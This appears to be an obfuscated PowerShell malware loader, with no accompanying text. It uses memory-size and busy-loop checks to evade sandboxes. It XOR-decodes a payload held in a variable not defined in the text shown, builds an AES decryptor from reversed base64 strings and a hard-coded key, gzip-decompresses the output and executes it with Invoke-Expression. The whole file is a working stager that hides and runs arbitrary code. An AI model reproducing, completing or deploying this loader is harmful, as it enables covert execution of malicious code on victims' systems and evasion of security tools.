$umzhkqngngwnz = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($umzhkqngngwnz -lt 250) { $oryizpwsxhihr = "a" * 300MB }
$rtrjjrinyg = 0
$gimrsqortjwutrtmo = 30000000
For ($rtrjjrinyg=0; $rtrjjrinyg -lt $gimrsqortjwutrtmo;$rtrjjrinyg++) { $rtrjjrinyg++ }
$umsqngkswmwnyi = [System.Text.Encoding]::UTF8.GetBytes("yonxmxyvvvqpj")
$jnktqhpiijriihww = [System.Text.Encoding]::UTF8.GetBytes($omnmvzkzzxg)
$gjhgvvwyuwkm = $(for ($rrimxwytqugkq = 0; $rrimxwytqugkq -lt $jnktqhpiijriihww.length; ) {
    for ($jkvwjwggottt = 0; $jkvwjwggottt -lt $umsqngkswmwnyi.length; $jkvwjwggottt++) {
        $jnktqhpiijriihww[$rrimxwytqugkq] -bxor $umsqngkswmwnyi[$jkvwjwggottt]
        $rrimxwytqugkq++
        if ($rrimxwytqugkq -ge $jnktqhpiijriihww.Length) {
            $jkvwjwggottt = $umsqngkswmwnyi.length
        }
    }
})
$gjhgvvwyuwkm = [System.Text.Encoding]::UTF8.GetString($gjhgvvwyuwkm)
$wyxpyihqjky = "$gjhgvvwyuwkm"
$pnptxqqzvjixpirs = $wyxpyihqjky.ToCharArray()
[array]::Reverse($pnptxqqzvjixpirs)
$khkzgyjqmgnsgii = -join($pnptxqqzvjixpirs)
$thgpyuzvxgmipz = [System.Convert]::FromBase64String("$khkzgyjqmgnsgii")
$xunnphrokx = [System.Convert]::FromBase64String("33l3WFzbuqpncKvfZHZdUExMfBoIdbWqbofDN3QNrAk=")
$otwogxvhxyvzrsi = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$imkvinmtqiyguj = $otwogxvhxyvzrsi.ToCharArray()
[array]::Reverse($imkvinmtqiyguj)
$nyhwtvhvsppr = -join($imkvinmtqiyguj)
$vusypqwrpiirgusvg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($nyhwtvhvsppr))
$vhzwpjytonhxmpumz = New-Object "$vusypqwrpiirgusvg"
$vngutgjhwsojmvss = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$wnhjytvipt = $vngutgjhwsojmvss.ToCharArray()
[array]::Reverse($wnhjytvipt)
$xxriigzsthvv = -join($wnhjytvipt)
$zmpzwkoqkmut = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($xxriigzsthvv))
$piqrntrgznnkpqj = & ([scriptblock]::Create($zmpzwkoqkmut))
$vhzwpjytonhxmpumz.Mode = $piqrntrgznnkpqj
$ixtthnkqinsvuuymk = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$owjkrquuukto = $ixtthnkqinsvuuymk.ToCharArray()
[array]::Reverse($owjkrquuukto)
$uyzmmqwuphtyujtsr = -join($owjkrquuukto)
$opsrkzvruipunq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uyzmmqwuphtyujtsr))
$ujyvskjxpiqxnyjv = & ([scriptblock]::Create($opsrkzvruipunq))
$vhzwpjytonhxmpumz.Padding = $ujyvskjxpiqxnyjv
$vhzwpjytonhxmpumz.BlockSize = 128
$vhzwpjytonhxmpumz.KeySize = 192
$vhzwpjytonhxmpumz.Key = $xunnphrokx
$vhzwpjytonhxmpumz.IV = $thgpyuzvxgmipz[0..15]
$xhgoxppzwsojzn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$qjnzsxzjirxx = New-Object $xhgoxppzwsojzn(,$vhzwpjytonhxmpumz.CreateDecryptor().TransformFinalBlock($thgpyuzvxgmipz,16,$thgpyuzvxgmipz.Length-16))
$xpwiuywgzozgnx = New-Object $xhgoxppzwsojzn
$umumjnzwxsqjsyr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$hogjmrpnvohwo = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$gqsnxyhmxqyvtmv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))
$wjwpsrnomnoknrr = New-Object $gqsnxyhmxqyvtmv $qjnzsxzjirxx, ($hogjmrpnvohwo::$umumjnzwxsqjsyr)
$wjwpsrnomnoknrr.CopyTo($xpwiuywgzozgnx)
$wjwpsrnomnoknrr.Close()
$vhzwpjytonhxmpumz.Dispose()
$qjnzsxzjirxx.Close()
$mgxmsiwwjtpor = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$qjttvnnzroyv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$ozugtsturgvxguhuy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$wptxwmvoimytvrnq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$tmouhmhwkpowxx = $mgxmsiwwjtpor::$qjttvnnzroyv.$wptxwmvoimytvrnq($xpwiuywgzozgnx.$ozugtsturgvxguhuy())
Invoke-Expression($tmouhmhwkpowxx)